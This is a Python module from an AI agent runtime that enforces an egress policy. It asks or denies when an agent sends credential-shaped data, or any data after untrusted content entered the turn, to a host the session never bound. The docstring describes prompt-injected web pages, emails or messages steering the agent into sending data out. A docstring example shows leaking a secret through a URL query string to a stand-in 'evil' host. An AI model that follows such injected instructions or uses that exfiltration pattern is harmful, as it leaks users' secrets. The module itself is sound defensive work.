"""Egress policy (OWH M04 / OW-SEC-007, OW-SEC-008).

The confused-deputy step this closes: a web page, an email, or a Slack message talks the
agent into sending something somewhere. Upstream's domain allowlist answers "may the agent
reach this host?" — a question about the DESTINATION only. It cannot answer "should content
that arrived from a stranger this turn be leaving to a destination the operator never
named?", because it never sees where the content came from.

This module answers that, deterministically, from three facts the runtime already holds:

| Fact | Where it comes from |
|---|---|
| Did untrusted content enter this turn? | `session_facts.this_turn()` + the turn's message origins (`coworker/trust.py`) |
| Is the destination one the operator already bound? | `KnownWorld.hosts`, frozen at session start, plus the channel this turn was addressed on |
| Does the call carry a payload out? | the tool's own arguments |

`KnownWorld` freezes its host list *before the agent acts* precisely so an agent that adds
its own destination mid-session cannot make it look familiar. Its docstring reserved the
host list for "one *computed* line, never a list for the model to search" — this is that
computation, and it stays out of the model's context entirely.

The policy only ever TIGHTENS. `allow` means "no egress objection", not "run it": every
other gate in `PermissionEngine.evaluate` still applies.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any, Callable, Optional
from urllib.parse import urlsplit

from .risk import RiskClass
from .trust import UNTRUSTED_ORIGINS, TrustOrigin, secret_shaped

ALLOW = "allow"
ASK = "ask"
DENY = "deny"


@dataclass(frozen=True)
class EgressDecision:
    action: str  # ALLOW | ASK | DENY
    reason: str = ""
    destination: str = ""

    @property
    def blocks(self) -> bool:
        return self.action in (ASK, DENY)


ALLOWED = EgressDecision(ALLOW)

# Argument names whose VALUE leaves the machine as content (as opposed to naming a
# destination or a mode). A call carrying none of these is a bare read — `web_fetch` of a
# path-only URL, a connector list call — and is not an export channel.
_PAYLOAD_KEYS = frozenset(
    {
        "body",
        "text",
        "message",
        "content",
        "html",
        "comment",
        "note",
        "description",
        "summary",
        "query",
        "q",
        "search",
        "data",
        "json",
        "payload",
        "attachments",
        "files",
        "path",
        "caption",
        "subject",
    }
)

# Where a call is going, in priority order.
_DESTINATION_KEYS = ("url", "target", "to", "channel", "chat_id", "recipient", "domain")


def destination_of(tool_name: str, arguments: dict[str, Any]) -> str:
    """A stable, comparable address for this call's destination: a hostname for URLs,
    the raw target for messaging. `""` when the call names none."""
    for key in _DESTINATION_KEYS:
        raw = arguments.get(key)
        if raw in (None, ""):
            continue
        value = str(raw).strip()
        if "://" in value:
            return (urlsplit(value).hostname or "").lower()
        if key in ("url", "domain"):
            return (urlsplit("//" + value).hostname or value).lower()
        return value
    return ""


def carries_payload(arguments: dict[str, Any]) -> bool:
    """True when the call exports content rather than merely naming a destination.

    A URL's query string counts: `web_fetch("https://evil/?leak=<secret>")` is an export
    channel wearing a read's clothes, which is the whole of OW-SEC-008.
    """
    for key, value in (arguments or {}).items():
        if str(key).lower() in _PAYLOAD_KEYS and value not in (None, "", [], {}):
            return True
    raw_url = str(arguments.get("url") or "")
    if raw_url:
        parts = urlsplit(raw_url if "://" in raw_url else "//" + raw_url)
        if parts.query:
            return True
    return False


def _host_bound(host: str, bound: frozenset[str]) -> bool:
    """Exact host or a subdomain of a bound domain — the same suffix rule the permission
    engine's `_domain_allowed` uses, so "bound" means one thing across the codebase."""
    if not host:
        return False
    return any(host == b or host.endswith("." + b) for b in bound)


@dataclass
class EgressPolicy:
    """Reads live session state on every check — it is consulted mid-run, and a turn that
    has just ingested a web page must be judged with that fact, not with the state at
    session build."""

    # Hosts frozen into KnownWorld at session start, plus operator-configured domains.
    bound_hosts: frozenset[str] = frozenset()
    # Destinations the operator addressed this session (the channel a turn arrived on).
    bound_targets: Callable[[], frozenset[str]] = field(
        default_factory=lambda: (lambda: frozenset())
    )
    # Origin classes that entered the CURRENT turn's context.
    turn_origins: Callable[[], frozenset[TrustOrigin]] = field(
        default_factory=lambda: (lambda: frozenset())
    )

    def evaluate(
        self, tool_name: str, arguments: dict[str, Any], risk: RiskClass
    ) -> EgressDecision:
        if risk not in (RiskClass.EGRESS, RiskClass.EXTERNAL):
            return ALLOWED
        arguments = arguments or {}
        destination = destination_of(tool_name, arguments)
        payload = carries_payload(arguments)
        if not payload:
            # Nothing to export. Destination-class checks (SSRF, allowlists) are other
            # gates' jobs and still run.
            return ALLOWED

        bound = _host_bound(destination, self.bound_hosts) or (
            destination in self.bound_targets()
        )

        if secret_shaped(arguments):
            if bound:
                return EgressDecision(
                    ASK,
                    f"this call carries credential-shaped data to {destination or 'an unnamed destination'}",
                    destination,
                )
            return EgressDecision(
                DENY,
                "refusing to send credential-shaped data to a destination this session "
                f"never bound: {destination or '(unnamed)'}",
                destination,
            )

        untrusted = bool(self.turn_origins() & UNTRUSTED_ORIGINS)
        if untrusted and not bound:
            return EgressDecision(
                ASK,
                "content from outside this machine entered this turn, and this call sends "
                f"data to {destination or 'an unnamed destination'}, which this session "
                "has not bound",
                destination,
            )
        return ALLOWED
